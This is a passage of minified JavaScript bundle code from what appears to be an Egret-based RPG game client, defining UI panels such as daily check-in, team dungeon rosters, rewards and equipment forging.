n=i(3),o=i(0),s=i(92),a=i(10),r=i(383),l=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.dataChanged=function(){var t=this.data.rewards;this.experience.data=t[0],this.randomRune.data=t[1],this.runeCream.data=t[2];var e=s.SkyLevelModel.ins(),i=e.getNextOpenLevel();if(i){this.target.data||(this.target.data=i.showIcon);var n=o.GlobalConfig.FbChallengeConfig[e.cruLevel],l=o.GlobalConfig.ItemConfig[i.showIcon],h=a.ItemUtil.getQuality2(l),u=gettext("层解锁");h==r.FBChallengePanel.RunType&&(u=gettext("层获得")),n.group==i.group?this.leftlabel.text=""+i.layer+u:this.leftlabel.text=gettext("再闯{0}",i.id-n.id)+u}},e}(n.BaseItemRender);e.BossRewardsItem=l,window.BossRewardsItem=l,__reflect(l.prototype,"BossRewardsItem",[]),window.BossRewardsItem=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BtnListList=void 0;var n=i(1),o=i(592),s=i(273),a=i(24),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.isOpen=!1,e.tempSelect=0,e._sn_="btnlistlistskin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onClick),this.btnListDp=new eui.ArrayCollection,this.eBtnList.dataProvider=this.btnListDp,this.eBtnList.itemRenderer=o.ButtonListItem},e.prototype.addDisplay=function(){this.updateBtnList()},e.prototype.setData=function(t){this.datas=t,this.skin&&this.updateBtnList()},e.prototype.updateBtnList=function(){this.btnListDp.replaceAll(a.CommonUtils.objectToArray(this.datas)),this.eBtnList.validateNow()},e.prototype.onClick=function(t){t.target instanceof s.ButtonItem?this.id2=t.target.itemIndex+1:t.target instanceof o.ButtonListItem&&(this.isOpen&&this.tempSelect==this.eBtnList.selectedIndex?(this.tempSelect=this.eBtnList.selectedIndex,this.eBtnList.selectedIndex=-1,this.isOpen=!1):(this.tempSelect=this.eBtnList.selectedIndex,this.isOpen=!0))},Object.defineProperty(e.prototype,"id2",{get:function(){return this._id2},set:function(t){if(this._id2!=t||this.id1!=this.eBtnList.selectedIndex+1){if(this.id1!=this.eBtnList.selectedIndex+1){var e=this.eBtnList.getElementAt(this.id1-1);null===e||void 0===e?void 0:e.listSelect(-1)}this.id1=Math.max(1,this.eBtnList.selectedIndex+1),this._id2=t;var i=this.eBtnList.getElementAt(this.eBtnList.selectedIndex);null===i||void 0===i?void 0:i.listSelect(this._id2-1)}},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"id1",{get:function(){return this._id1},set:function(t){this._id1=t,this.eBtnList.selectedIndex=Math.max(-1,t-1)},enumerable:!1,configurable:!0}),e}(n.BaseView);e.BtnListList=r,window.BtnListList=r,__reflect(r.prototype,"BtnListList",[])},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DailyCheckInPanel=void 0;var n=i(21),o=i(90),s=i(16),a=i(5),r=i(1),l=i(0),h=i(124),u=i(6),p=i(25),d=i(2),c=i(27),f=i(594),g=i(198),m=i(593),v=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="DailyCheckInPanelSkin",e.isTweenItem=!1,e.currentDay=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.cardList.itemRenderer=m.DailyCheckInCard,this.eff=new n.MovieClip,this.listData=new eui.ArrayCollection([]),this.cardList.dataProvider=this.listData},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.onCheckInData,g.DailyCheckIn.ins().postCheckInData),observe(this,this.onCheckIn,g.DailyCheckIn.ins().postCheckIn),this.cardScroller.addEventListener(egret.Event.ENTER_FRAME,this.updateListPos,this),this.addTouchEvent(this.cardList,this.onListTap),this.addTouchEvent(this.rewardBtn,this.ondayRewardListTap),this.isTweenItem=!0,this.initPanel(),this.updateList(),this.cardList.scrollV=0},e.prototype.toCheckIn=function(t){g.DailyCheckIn.ins().sendCheckIn(t)},e.prototype.onCheckIn=function(t){var e=t[0],i=t[1],n=e?gettext("签到成功"):gettext("签到失败，请稍后再试");d.TipsCT.ins().showTips(n),e&&this.isTweenItem&&this.runTweenItem(this,i)},e.prototype.runTweenItem=function(t,e){if(t){var i=t.cardList;if(i){var n=i.getElementAt(e-1);if(n){var o=n.data;if(o){var s=l.GlobalConfig.ItemConfig[o.rewards[0].id];if(s){var a=i.localToGlobal(n.x+(n.width>>1),n.y+(n.height>>1)),r=a.x,h=a.y;return[s.icon.toString(),r,h]}}}}}},e.prototype.onCheckInData=function(t){this.updateList()},e.prototype.onListTap=function(t){var e=this;if(t&&t.currentTarget&&this.cardList.selectedItem){var i=g.DailyCheckIn.ins().getCheckInState(this.cardList.selectedItem.day);if(i)if(1==i){var n=this.cardList.selectedItem,s=u.BagCT.ins().rockonNeedNum(n.rewards);if(s&&u.BagCT.ins().getAllSurplusCount(s)<0)return void d.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容"));if(window.platform.isshen())return void this.toCheckIn(this.cardList.selectedItem.day);if(p.Recharge.ins().isGotAdPrivilege||o.DeviceUtils.IsPC)return void this.toCheckIn(this.cardList.selectedItem.day);if(2==platform.getAdType())return void this.toCheckIn(this.cardList.selectedItem.day);if(3==platform.getAdType())return void this.toCheckIn(this.cardList.selectedItem.day);1==platform.getAdType()?c.WarnWin.show(gettext("是否观看广告来获取双倍领取?"),function(){window.platform.showAd(function(){e.toCheckIn(e.cardList.selectedItem.day)},h.AdType.QianDao)},this,function(){e.toCheckIn(e.cardList.selectedItem.day)},this):this.toCheckIn(this.cardList.selectedItem.day)}else 2==i&&d.TipsCT.ins().showTips(gettext("已签到"));else this.cardList.selectedItem.day>this.currentDay&&d.TipsCT.ins().showTips(gettext("未到签到时间"))}},e.prototype.ondayRewardListTap=function(t){g.DailyCheckIn.ins().sendGetReward(this.curRewardData.days)},e.prototype.initPanel=function(){this.monthList=f.CheckInConfigMgr.ins().getMonthRewardCfg_Daily(),this.listData.replaceAll(this.monthList)},e.prototype.updateList=function(){this.addDate()},e.prototype.addDate=function(){this.listData.replaceAll(this.monthList);var t=g.DailyCheckIn.ins().conLoginTimes,e=g.DailyCheckIn.ins().getRewardList(g.DailyCheckIn.ins().rewardIndex);if(e){this.rewardBtn.visible=this.rewardItem.visible=!0,this.curRewardData=e;var i=this.curRewardData.days-t>=0?this.curRewardData.days-t:0,n=t>=this.curRewardData.days,o=gettext("已累计签到(|C:${color1}&T:{0}|/|C:${color2}&T:{1}|)天，\n再签到|C:${color3}&T:{0}天|领取奖励。",t,this.curRewardData.days,i);this.dayReardText.textFlow=a.TextFlowMaker.generateTextFlow(o),this.rewardItem.data=this.curRewardData.rewards[0],n?(this.rewardBtn.enabled=!0,this.eff.playFile(RES_DIR_EFF+"BtnPrompt1",-1),this.eff.parent||this.rewardGroup.addChild(this.eff)):(this.rewardBtn.enabled=!1,s.DisplayUtils.removeFromParent(this.eff))}else s.DisplayUtils.removeFromParent(this.eff),this.rewardBtn.visible=this.rewardItem.visible=!1,this.rewardBtn.enabled=!1,this.dayReardText.textFlow=a.TextFlowMaker.generateTextFlow(gettext("已领取所有的累计奖励"))},e.prototype.updateListPos=function(){this.cardScroller.removeEventListener(egret.Event.ENTER_FRAME,this.updateListPos,this);var t=g.DailyCheckIn.ins().loginTimes;t>=25&&(this.cardScroller.viewport.scrollV=this.cardScroller.viewport.contentHeight-this.cardScroller.height)},e.prototype.tabRp=function(){return g.DailyCheckIn.ins().rp.v},e}(r.BaseView);e.DailyCheckInPanel=v,window.DailyCheckInPanel=v,__reflect(v.prototype,"DailyCheckInPanel",[]),window.DailyCheckInPanel=v},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CompassRewardItem=void 0;var n=i(18),o=i(24),s=i(3),a=i(0),r=i(9),l=i(58),h=function(t){function e(){var e=t.call(this)||this;return e._sn_="CompassRewardItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged(),this.itemReward.touchEnabled=this.itemReward.touchChildren=!1,this.addTouchEvent(this.linkGrp,this.onClick)},e.prototype.dataChanged=function(){if(this.skin&&this.data&&(this.curCfg=a.GlobalConfig.CompassTaskConfig[this.data.taskId],this.curCfg)){var t=this.data.count>=this.curCfg.target,e=t?n.ColorUtil.GREEN:n.ColorUtil.RED,i=l.LangUtils.formatStr(this.curCfg.name,["|C:"+e+"&T:"+o.CommonUtils.overLength(this.data.count)+"/"+o.CommonUtils.overLength(this.curCfg.target)+"|"]);this.lbName.textFlow=TextFlowMakerEntry.generateTextFlow(i),this.itemReward.data=this.curCfg.rewarshow[0],this.linkGrp.visible=this.curCfg.turn&&!t,this.finishg.visible=t}},e.prototype.onClick=function(t){this.curCfg&&r.Activity.ins().handleTurn(this.curCfg.turn)},e}(s.BaseItemRender);e.CompassRewardItem=h,window.CompassRewardItem=h,__reflect(h.prototype,"CompassRewardItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ConsumePanel=void 0;var n=i(1),o=i(30),s=i(5),a=i(18),r=i(4),l=i(10),h=i(0),u=i(6),p=i(2),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.tips="",e.isEnough=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.color=this.eV.textColor},e.prototype.setConsume=function(t){this.costItem=t,this.skin&&this.update()},e.prototype.getConsume=function(){return this.costItem},e.prototype.addDisplay=function(){observe(this,this.update,u.BagCT.ins().postItemChange),observe(this,this.update,u.BagCT.ins().postItemAdd),observe(this,this.update,u.BagCT.ins().postItemDel),observe(this,this.update,r.ActorCC.postYbChange),this.update()},e.prototype.checkEnough=function(t){return void 0===t&&(t=!1),this.isEnough?!0:(t&&""!=this.tips&&p.TipsCT.ins().showTips(this.tips),!1)},e.prototype.update=function(){if(this.visible=!!this.costItem,this.isEnough=!this.costItem,this.tips="",this.visible)if(0==this.costItem.type){this.eI.source=o.RewardData.getCurrencyRes(this.costItem.id);var t=r.ActorCC.getCurrencyByType(this.costItem.id);this.isEnough=t>=this.costItem.count,this.tips=this.isEnough?"":o.RewardData.getCurrencyName(this.costItem.id)+"不足",this.eV.textFlow=s.TextFlowMaker.generateTextFlow("|C:"+(this.isEnough?this.color:a.ColorUtil.RED)+"&T:"+t+"/"+this.costItem.count+"|")}else{var e=h.GlobalConfig.ItemConfig[this.costItem.id];this.eI.source=l.ItemUtil.getItemSource(e);var i=l.ItemUtil.isEquip(e),t=u.BagCT.ins().getBagGoodsCountById(i?u.BagCT.BAG_TYPE_EQUIP:u.BagCT.BAG_TYPE_OTHTER,this.costItem.id);this.isEnough=t>=this.costItem.count,this.tips=this.isEnough?"":e.name+"不足",this.eV.textFlow=s.TextFlowMaker.generateTextFlow("|C:"+(this.isEnough?this.color:a.ColorUtil.RED)+"&T:"+t+"/"+this.costItem.count+"|")}},__decorate([delayCall(100)],e.prototype,"update",null),e}(n.BaseView);e.ConsumePanel=d,window.ConsumePanel=d,__reflect(d.prototype,"ConsumePanel",[]),window.ConsumePanel=d},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DCBtnItemRender=void 0;var n=i(5),o=i(3),s=function(t){function e(){var e=t.call(this)||this;return e.touchChildren=!0,e}return __extends(e,t),e.prototype.dataChanged=function(){this.dcNameTxt.textFlow=n.TextFlowMaker.generateTextFlow(this.data.cfg.dcName),this.dcImg.source=null,this.dcImg.source=this.data.cfg.nameImg,this.redPoint.visible=1==this.data.state,this.actTxt.visible=1==this.data.state,this.cantActTxt.visible=0==this.data.state},e.prototype.selectChange=function(){this.xuanzhong.visible=this.selected},e}(o.BaseItemRender);e.DCBtnItemRender=s,window.DCBtnItemRender=s,__reflect(s.prototype,"DCBtnItemRender",[]),window.DCBtnItemRender=s
},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DCPotentialItemCell=void 0;var n=i(0),o=i(49),s=i(1599),a=i(21),r=function(t){function e(){var e=t.call(this)||this;return e.lastId=0,e.lastValue=-1,e.actived=!1,e.touchChildren=!1,e.touchEnabled=!0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.inited=!0,this.mc=new a.MovieClip,this.mc.x=40,this.mc.y=43,this.update()},e.prototype.setData=function(t){this.data=t,this.inited&&this.update()},e.prototype.update=function(){if(this.data){this.redPoint.visible=!1,this.potentialImg.source=null,this.potentialImg.source=n.GlobalConfig.DemonCirSkill[this.data.id][1].skillIcon+"_png",this.potentialImg.filters=this.data.actived?null:o.FilterUtil.ARRAY_GRAY_FILTER;var t=0;if(this.data.param)for(var e=0;e<this.data.param.length;e++)t+=this.data.param[e].value;this.lastId==this.data.id&&this.lastValue!=t&&this.data.actived&&this.playEff(),this.lastId=this.data.id,this.lastValue=t,this.hasEventListener(egret.TouchEvent.REMOVED_FROM_STAGE)||this.addEventListener(egret.TouchEvent.REMOVED_FROM_STAGE,this.onRmove,this),this.hasEventListener(egret.TouchEvent.TOUCH_TAP)||this.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onTouch,this)}},e.prototype.onRmove=function(t){this.removeEventListener(egret.TouchEvent.REMOVED_FROM_STAGE,this.onRmove,this),this.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.onTouch,this),this.data=null},e.prototype.onTouch=function(t){this.data&&win.open(s.DCSkillTipsWin,this.data)},e.prototype.playEff=function(){this.mc.playFile(RES_DIR_EFF+"UpEff1",1),this.addChild(this.mc)},e}(eui.Component);e.DCPotentialItemCell=r,window.DCPotentialItemCell=r,__reflect(r.prototype,"DCPotentialItemCell",[]),window.DCPotentialItemCell=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DCSkillTipsWin=void 0;var n=i(1),o=i(0),s=i(5),a=i(22),r=function(t){function e(){var e=t.call(this)||this;return e._sn_="DCSkillTips",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.data=t[0],this.addTouchEvent(this,this.onTouch),this.update()},e.prototype.update=function(){var t=o.GlobalConfig.DemonCirSkill[this.data.id],e=t[1];this.potentialName0.textFlow=s.TextFlowMaker.generateTextFlow(e.skillName),this.potentialName1.text=e.skillName+" (Max)",this.infoTxt.visible=!this.data.actived;for(var i,n,r,l=this.data.param,h=Object.keys(t).length,u=l?l.length:0,p="",d="",c=0;h>c;c++)if(r=u>c?l[c]:null,e=t[c+1],2==e.skillType)i=((r?r.value:e.attrMin)/100).toFixed(1)+"%",n=(e.attrMax/100).toFixed(1)+"%",p+=e.skillDesc+i+"\n",d+=e.skillDesc+n+"\n";else{var f=r?a.AttributeData.getAttrValStrByType(r.param,r.value):100;p+=e.skillDesc+f+"\n";var g=new a.AttributeData(e.attrType,e.attrMax);d+=e.skillDesc+a.AttributeData.getAttrValStr(g)+"\n"}p=this.data.actived?p:gettext("未领悟"),this.Desc0.textFlow=s.TextFlowMaker.generateTextFlow1(p),this.skillDesc1.textFlow=s.TextFlowMaker.generateTextFlow1(d)},e.prototype.onTouch=function(t){t.target==this.bgClose&&win.close(this)},e}(n.BaseView);e.DCSkillTipsWin=r,window.DCSkillTipsWin=r,__reflect(r.prototype,"DCSkillTipsWin",[]),window.DCSkillTipsWin=r},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.demonCirListItemRender=void 0;var n=i(3),o=i(49),s=i(16),a=function(t){function e(){var e=t.call(this)||this;return e.touchChildren=!0,e}return __extends(e,t),e.prototype.dataChanged=function(){this.lvCount.text=this.data.actived?"Lv."+this.data.level:"",this.nameImg.source=null,this.nameImg.source=this.data.cfg.nameImg,this.redPoint.visible=this.data.showRed,this.deEff||(this.deEff=ObjectPool.pop("MovieClip")),this.deEff.parent||this.demonCirEff.addChild(this.deEff),this.deEff.hasEventListener(egret.TouchEvent.REMOVED_FROM_STAGE)||this.deEff.addEventListener(egret.TouchEvent.REMOVED_FROM_STAGE,this.onRemove,this),this.hasEventListener(egret.TouchEvent.TOUCH_TAP)||this.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onTouch,this),this.deEff.playFile(""+RES_DIR_EFF+this.data.cfg.winEff,-1),this.deEff.filters=this.data.actived?null:o.FilterUtil.ARRAY_GRAY_FILTER},e.prototype.onRemove=function(t){this.deEff&&(this.deEff.removeEventListener(egret.TouchEvent.REMOVED_FROM_STAGE,this.onRemove,this),this.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.onTouch,this),s.DisplayUtils.removeFromParent(this.deEff),this.deEff=null)},e.prototype.onTouch=function(t){},e}(n.BaseItemRender);e.demonCirListItemRender=a,window.demonCirListItemRender=a,__reflect(a.prototype,"demonCirListItemRender",[]),window.demonCirListItemRender=a},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BabelLotteryItem=void 0;var n=function(t){function e(){var e=t.call(this)||this;return e._sn_="tttZhuanpanItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.rewardState(this.isGet)},e.prototype.addDisplay=function(){this.skin&&this.item&&(this.itemIcon.data=this.item)},e.prototype.rewardState=function(t){this.isGet=t,t?this.currentState="yilingqu":this.currentState="weilingqu"},e.prototype.changeEquipEffect=function(t){var e=this.itemIcon.EquipEffect;e.data=RES_DIR_EFF+t},e.prototype.setItem=function(t){this.item=t,this.addDisplay()},e}(eui.Component);e.BabelLotteryItem=n,window.BabelLotteryItem=n,__reflect(n.prototype,"BabelLotteryItem",[]),window.BabelLotteryItem=n},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TeamFbRankItemRender=void 0;var n=i(3),o=i(0),s=i(32),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="teamFbRankItem",e}return __extends(e,t),e.prototype.dataChanged=function(){if(this.data){this.member.visible=!0,this.noteam.visible=!1,s.FbCT.ins().isNormal?this.fubenName.text=o.GlobalConfig.TeamFuBenConfig[this.data.configID].name:this.fubenName.text=o.GlobalConfig.TeamFuBenExConfig[this.data.configID].name;for(var t=void 0,e=void 0,i=this.data.members.length,n=0;3>n;n++)t=this["img"+n],e=this["nameTxt"+n],i>=n+1?(t.source=1==this.data.members[n].position?"road_leader":2==this.data.members[0].position?"road_assistant":"",e.text=this.data.members[n].roleName):(t.source="",e.text="")}else this.member.visible=!1,this.noteam.visible=!0},e}(n.BaseItemRender);e.TeamFbRankItemRender=a,window.TeamFbRankItemRender=a,__reflect(a.prototype,"TeamFbRankItemRender",[]),window.TeamFbRankItemRender=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TeamFbRoleItemRender=void 0;var n=i(3),o=i(249),s=i(2),a=i(0),r=i(32),l=i(10),h=i(4),u=i(44),p=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.touchEnabled=!1,this.addTouchEvent(this,this.onTouch)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.dataChanged()},e.prototype.onTouch=function(t){switch(t.target){case this.invite:case this.nomember:if(this.data.type){if(!o.RareAnimalCT.ins().isTFCaptain)return void s.TipsCT.ins().showTips(gettext("队长才能邀请玩家"));win.open("TeamFbInviteWin","xxx",o.RareAnimalCT.ins().teamID)}else if(r.FbCT.ins().isNormal){if(!r.FbCT.ins().isTFCaptain)return void s.TipsCT.ins().showTips(gettext("队长才能邀请玩家"));win.open("TeamFbInviteWin",a.GlobalConfig.TeamFuBenBaseConfig.inviteText.replace("%s",a.GlobalConfig.TeamFuBenConfig[r.FbCT.ins().tfPassID+1].name),r.FbCT.ins().tfRoomID,this.data.configID)}else{if(!r.FbCT.ins().isPurgatoryTFCaptain)return void s.TipsCT.ins().showTips(gettext("队长才能邀请玩家"));win.open("TeamFbInviteWin",a.GlobalConfig.TeamFuBenBaseConfig.inviteText.replace("%s",a.GlobalConfig.TeamFuBenExConfig[r.FbCT.ins().tfPurgatoryPassID+1].name),r.FbCT.ins().tfPurgatoryRoomID,this.data.configID)}break;case this.rolegroup:u.ReadPlayerCT.ins().sendFindPlayer(this.data.vo.roleID);break;case this.btnRemove:r.FbCT.ins().isNormal?r.FbCT.ins().sendOutTFRoom(this.data.vo.roleID):r.FbCT.ins().sendOutPurgatoryTFRoom(this.data.vo.roleID)}},e.prototype.dataChanged=function(){if(this.btnRemove.visible=!1,this.data&&this.skin)if(this.data.vo){this.rolegroup.visible=!0,this.nomember.visible=this.invite.visible=!1,this.position.visible=!0;var t=this.data.vo;this.showRole(t),this.lab.visible=!1,3!=t.position?(this.position.visible=!0,this.position.source=1==t.position?"road_leader":"road_assistant"):this.position.visible=!1,r.FbCT.ins().isNormal?this.btnRemove.visible=(this.data.type?o.RareAnimalCT.ins().isTFCaptain:r.FbCT.ins().isTFCaptain)&&t.roleName!=h.ActorCC.myName:this.btnRemove.visible=(this.data.type?o.RareAnimalCT.ins().isTFCaptain:r.FbCT.ins().isPurgatoryTFCaptain)&&t.roleName!=h.ActorCC.myName}else this.nomember.visible=this.invite.visible=!0,this.position.visible=!1,this.lab.visible=!0,this.rolegroup.visible=!1},e.prototype.showRole=function(t){var e;if(t&&(t.outward?this.bgkuang.source=(null===(e=a.GlobalConfig.TitleConf[t.outward])||void 0===e?void 0:e.img)+"_png":this.bgkuang.source="entity_bg",r.FbCT.ins().isNormal?this.eIcon.source="yuanhead"+t.job+t.sex:this.eIcon.source="yuanhead"+t.job+"1",this.lb_lv.text=t.lv+"",t.power&&void 0!=t.power?this.ePow.text=t.power+"":this.ePow.text="",this.grpPower.visible=void 0==t.power?!1:!0,this.eNameLab.text=t.roleName,this.eTitleGrp.visible=!!t.title,this.eTitleGrp.visible)){var i=a.GlobalConfig.TitleConf[t.title];this.eTitle.text=null===i||void 0===i?void 0:i.name,this.eTitle.textColor=l.ItemUtil.getQualityColor((null===i||void 0===i?void 0:i.rare)||0),this.updateTitleEff(i)}},e.prototype.updateTitleEff=function(t){return t.eff?(this.titleMc||(this.titleMc=ObjectPool.pop("MovieClip"),this.effTopGrp.addChild(this.titleMc)),this.eTitle.visible=!1,this.effTopGrp.visible=!0,void this.titleMc.playFile(RES_DIR_EFF+t.eff,-1)):(this.titleMc&&this.effTopGrp.removeChild(this.titleMc),this.titleMc=null,this.effTopGrp.visible=!1,void(this.eTitle.visible=!0))},e}(n.BaseItemRender);e.TeamFbRoleItemRender=p,window.TeamFbRoleItemRender=p,__reflect(p.prototype,"TeamFbRoleItemRender",[]),window.TeamFbRoleItemRender=p},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ForgeBoostPanel=void 0;var n=i(1),o=i(21),s=i(139),a=i(6),r=i(4),l=i(96),h=i(16),u=i(63),p=i(69),d=i(13),c=i(2),f=i(22),g=i(115),m=i(34),v=i(38),y=i(18),C=i(5),T=i(72),b=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._curRole=0,e.isMax=!1,e.isAutoUp=!1,e.itemNum=0,e.startPos=0,e.isclick=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.upGradeBtn.label=gettext("强  化"),this.curPanel=s.ForgeWin.Page_Select_Boost,this.getItemTxt.textFlow=(new egret.HtmlTextParser).parser("<u>"+this.getItemTxt.text+"</u>"),this.eff=new o.MovieClip,this.eff.x=this.upGradeBtn.width/2,this.eff.y=this.upGradeBtn.height/2,this.eff.touchEnabled=!1,this.addTouchEvent(this.upGradeBtn0,this.onTouch),this.addTouchEvent(this.getItemTxt,this.onGetItem),this.curRole=this.curRole},e.prototype.addDisplay=function(){var t=this;observe(this,this.setCount,a.BagCT.ins().postItemAdd),observe(this,this.setCount,a.BagCT.ins().postItemChange),observe(this,this.setView,r.ActorCC.postLevelChange),this.addTouchEvent(this.upGradeBtn,this.updateDown,!0),this.upGradeBtn.addEventListener(egret.TouchEvent.TOUCH_TAP,this.changeClick,this),observe(this,function(){return t.curRole=t.curRole},l.ForgeCT.ins().postForgeUpdate)},e.prototype.changeClick=function(){this.isclick=!1},e.prototype.updateDown=function(){h.DisplayUtils.removeFromParent(this.eff);var t=l.ForgeCT.ins().getEnhanceCostConfigByLv(this.lv+1);!this.isclick&&t&&(this.itemNum>=t.stoneNum?(p.SoundUtil.play(p.SoundEnum.FORGE),l.ForgeCT.ins().sendUpGrade(this.curRole,this.pos)):(this.isclick=!0,u.WarnCT.ins().setBuyGoodsWarn(t.stoneId,t.stoneNum-this.itemNum)))},e.prototype.removeDisplay=function(){this.removeTouchEvent(this.upGradeBtn,this.updateDown,!0),h.DisplayUtils.removeFromParent(this.eff),this.stopAutoUp(),this.upGradeBtn&&this.upGradeBtn.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.changeClick,this)},Object.defineProperty(e.prototype,"curRole",{get:function(){return this._curRole},set:function(t){if(this._curRole=t,this.skin){var e=d.SubRoles.ins().getSubRoleByIndex(this._curRole),i=e.getMinEquipIndexByType(this.curPanel);this.isMax=!1,this.setView(),this.changeData(i,e.getEquipByIndex(i).strengthen),this.stopAutoUp()}},enumerable:!1,configurable:!0}),e.prototype.setView=function(){h.DisplayUtils.removeFromParent(this.eff)},e.prototype.onTouch=function(t){switch(t.target){case this.upGradeBtn0:if(!this.isAutoUp){if(this.isAutoUp=!0,this.startPos=this.pos,!this.autoUpStarEx())return c.TipsCT.ins().showTips(gettext("材料不足")),void(this.isAutoUp=!1);var e;e||(e=new o.MovieClip,e.x=this.itemGroup.width/2+120,e.y=this.itemGroup.height/2+140,this.itemGroup.addChild(e)),e.playFile(RES_DIR_EFF+"UpEff4",1,function(){h.DisplayUtils.removeFromParent(e)})}}},e.prototype.stopAutoUp=function(){this.isAutoUp=!1,this.upGradeBtn0&&(this.upGradeBtn0.label=gettext("一键强化"),egret.Tween.removeTweens(this.upGradeBtn0))},e.prototype.autoUpBack=function(t){if(this.isAutoUp){var e=l.ForgeCT.ins().getEnhanceCostConfigByLv(this.lv+1);if(!e)return;if(this.itemNum<e.stoneNum)return this.isAutoUp=!1,void c.TipsCT.ins().showTips(gettext("材料不足"));if(this.startPos==t)return void(this.isAutoUp=!1);l.ForgeCT.ins().sendUpGrade(this.curRole,t)}},e.prototype.autoUpStarEx=function(){var t=l.ForgeCT.ins().getEnhanceCostConfigByLv(this.lv+1);return t?this.itemNum>=t.stoneNum?(p.SoundUtil.play(p.SoundEnum.FORGE),l.ForgeCT.ins().sendUpGrade(this.curRole,this.pos),!0):(this.upGradeBtn0.label=gettext("一键强化"),!1):!1},e.prototype.onGetItem=function(t){u.WarnCT.ins().setBuyGoodsWarn(l.ForgeCT.ins().getEnhanceCostConfigByLv(this.lv+1).stoneId,1)},e.prototype.changeData=function(t,e,i){void 0===t&&(t=this.pos),void 0===e&&(e=this.lv),void 0===i&&(i=!0),this.pos=t,this.lv=e;var n=l.ForgeCT.ins().countAllBoostAttr(this.curRole,this.curPanel);this.setAttrData(n),this.setPower(),this.setSlectedInfo(),i?(this.setCount(),this.upGradeBtn.touchEnabled=!0):this.upGradeBtn.touchEnabled=!1},e.prototype.strongMove=function(t){this.setTargetMove(this["show"+(this.pos+1)],t)},e.prototype.setPower=function(){var t=d.SubRoles.ins().getSubRoleByIndex(this.curRole);this._totalPower=t.getForgeTotalPower(this.curPanel),this._totalPower+=Math.floor(this._totalPower*g.DemonCir.ins().getAddPerBySysIDRoleId(m.AttrSystemID.asEnhance,this._curRole)/1e4),this.powerPanel.setPower(this._totalPower)},e.prototype.setTargetMove=function(t,e){var i=new eui.Image;i.source=t.source,i.x=t.x,i.y=t.y,i.verticalCenter=t.verticalCenter,i.horizontalCenter=t.horizontalCenter,t.parent.addChild(i),t=i;var n=egret.Tween.get(t,{loop:!1});n.to({scaleX:1.2,scaleY:1.2,alpha:.5},20).wait(80).to({scaleX:1,scaleY:1,alpha:2.8},0).wait(100).call(function(){h.DisplayUtils.removeFromParent(t),e()})},e.prototype.setSlectedInfo=function(){for(var t=d.SubRoles.ins().getSubRoleByIndex(this.curRole),e=t.equipsData,i=0;i<v.EquipCT.FOEGE_MAX;i++){var n=e[i].strengthen;this["level_"+i].text=n>0?"+"+n:"",this["show"+(i+1)].visible=i==this.pos,this["lianjiexian"+i].visible=i==this.pos}},e.prototype.setAttrData=function(t){var e,i=t.length;t=g.DemonCir.ins().getAttrsBySysID(t,m.AttrSystemID.asEnhance),t.sort(f.AttributeData.sortAttribute);for(var n=0;4>n;n++)this["attr"+n].text=i>n?f.AttributeData.getAttStrByType1(t[n],T.AttributeFormat.FORMAT_0()):"";if(e=l.ForgeCT.ins().getForgeConfigByPos(this.pos,this.lv+1,this.curPanel)){this.isMax=!1;var o="",s=l.ForgeCT.ins().countAllBoostAttr(this.curRole,this.curPanel,this.pos,!0);s=g.DemonCir.ins().getAttrsBySysID(s,m.AttrSystemID.asEnhance),s.sort(f.AttributeData.sortAttribute);for(var n=0;4>n;n++){if(i>n){var a=t[n];o=this.getAttrByType(s,a)}this["arrow"+n].visible=o.length>0,this["addAttr"+n].text=o}}else{this.isMax=!0;for(var n=0;4>n;n++)this["arrow"+n].visible=!1,this["addAttr"+n].text=""}this.upInfo.visible=!this.isMax,this.maxDesc.visible=this.isMax},e.prototype.setCount=function(){var 